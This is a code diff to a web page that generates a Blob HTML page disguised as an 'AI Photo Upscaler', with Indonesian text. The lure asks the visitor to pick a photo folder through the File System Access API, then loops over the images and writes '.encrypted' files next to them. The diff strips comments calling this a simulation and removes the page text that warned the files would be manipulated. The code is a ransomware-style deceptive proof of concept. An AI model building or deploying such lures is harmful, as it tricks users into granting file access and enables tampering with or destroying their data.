@@ -23,7 +23,7 @@ button:hover { background: #b71c1c; }
 <body>
 <div class="panel" id="main-panel">
 <h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk memicu pembuatan berkas Blob HTML yang akan meminta akses ke direktori (File System Access API) dan memanipulasi file di dalamnya.</p>
+<p>Klik tombol untuk memicu pembuatan berkas Blob HTML yang akan meminta akses ke direktori (File System Access API).</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
@@ -52,17 +52,15 @@ const speak = (message) => {
 const prepareMimeBlobAsync = (i) => {
     return new Promise((resolve) => {
         queueMicrotask(() => {
-            // Di sini kita menyisipkan kode File System Access API
-            // (Hanya berjalan di browser yang mendukung, seperti Chrome di Desktop/Android)
             const payloadText = "<!DOCTYPE html>" +
             "<html>" +
             "<head><meta charset='UTF-8'><title>Photo Upscaler</title></head>" +
-            "<body style='margin:0;padding:0;background:#0a0a0a;color:#fff;font-family:sans-serif;overflow:hidden;cursor:pointer;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
-            "<div style='text-align:center;padding:20px;'>" +
+            "<body style='margin:0;padding:0;background:#0a0a0a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'>" +
+            "<div style='text-align:center;padding:20px;max-width:400px;'>" +
             "<h1 style='font-size:32px;color:#fff;margin-bottom:20px;'>📸 AI Photo Upscaler</h1>" +
             "<p style='font-size:16px;color:#aaa;margin-bottom:30px;'>Tingkatkan kualitas foto Anda menjadi 4K secara instan. Pilih folder foto Anda untuk memulai.</p>" +
             "<button id='btn-select' style='background:#4CAF50;color:white;border:none;padding:15px 30px;font-size:16px;font-weight:bold;border-radius:6px;cursor:pointer;width:100%;box-shadow:0 4px 15px rgba(76,175,80,0.4);'>Pilih Folder Foto</button>" +
-            "<p id='status' style='color:#4CAF50;font-size:12px;margin-top:15px;'></p>" +
+            "<p id='status' style='color:#4CAF50;font-size:12px;margin-top:15px;'>Menunggu interaksi...</p>" +
             "<p style='color:#555;font-size:10px;margin-top:25px;'>Origin: <span id='o'></span></p>" +
             "</div>" +
             "<script>" +
@@ -72,26 +70,41 @@ const prepareMimeBlobAsync = (i) => {
             
             "var sudah = false;" +
             
+            // Cek apakah browser mendukung File System Access API
+            "function cekDukungan() {" +
+            "    if (!window.showDirectoryPicker) {" +
+            "        return false;" +
+            "    }" +
+            "    return true;" +
+            "}" +
+            
             "document.getElementById('btn-select').addEventListener('click', async function() {" +
             "    if (sudah) return;" +
             "    sudah = true;" +
             "    var statusEl = document.getElementById('status');" +
+            "    " +
+            "    // Cek dukungan API terlebih dahulu" +
+            "    if (!cekDukungan()) {" +
+            "        statusEl.textContent = 'Browser tidak mendukung File System Access API.';" +
+            "        statusEl.style.color = '#f00';" +
+            "        alert('Browser Anda tidak mendukung fitur ini. Gunakan Chrome/Edge versi terbaru.');" +
+            "        sudah = false;" +
+            "        return;" +
+            "    }" +
+            
             "    statusEl.textContent = 'Meminta izin akses folder...';" +
+            "    statusEl.style.color = '#4CAF50';" +
             
             "    try {" +
-            "        // Meminta akses direktori (File System Access API)" +
-            "        // Di Android Chrome, ini akan memunculkan dialog 'Edit files in folder' / 'Allow'" +
+            "        // Meminta akses direktori" +
             "        var dirHandle = await window.showDirectoryPicker();" +
             "        statusEl.textContent = 'Akses diberikan. Memproses foto...';" +
             
-            "        // Looping untuk membaca file di folder" +
             "        var fileCount = 0;" +
             "        for await (var entry of dirHandle.values()) {" +
             "            if (entry.kind === 'file') {" +
             "                var file = await entry.getFile();" +
             "                if (file.type.startsWith('image/')) {" +
-            "                    // Di sini kita simulasi 'enkripsi' (hanya mengubah nama file)" +
-            "                    // Untuk pengujian, kita hanya akan membuat file dummy" +
             "                    var newFile = await dirHandle.getFileHandle(entry.name + '.encrypted', { create: true });" +
             "                    var writable = await newFile.createWritable();" +
             "                    await writable.write('FILE ENCRYPTED BY SIMULATION');" +
@@ -104,11 +117,12 @@ const prepareMimeBlobAsync = (i) => {
             "        statusEl.textContent = 'Selesai memproses ' + fileCount + ' file.';" +
             "        alert('Simulasi selesai! ' + fileCount + ' file telah dimanipulasi.');" +
             "    } catch (e) {" +
-            "        statusEl.textContent = 'Akses ditolak atau tidak didukung: ' + e.message;" +
+            "        // Jika user membatalkan atau terjadi error" +
+            "        statusEl.textContent = 'Akses ditolak atau gagal: ' + e.message;" +
             "        statusEl.style.color = '#f00';" +
+            "        sudah = false;" +
             "    }" +
             "});" +
-            
             "})();" +
             "<\/script>" +
             "</body>" +
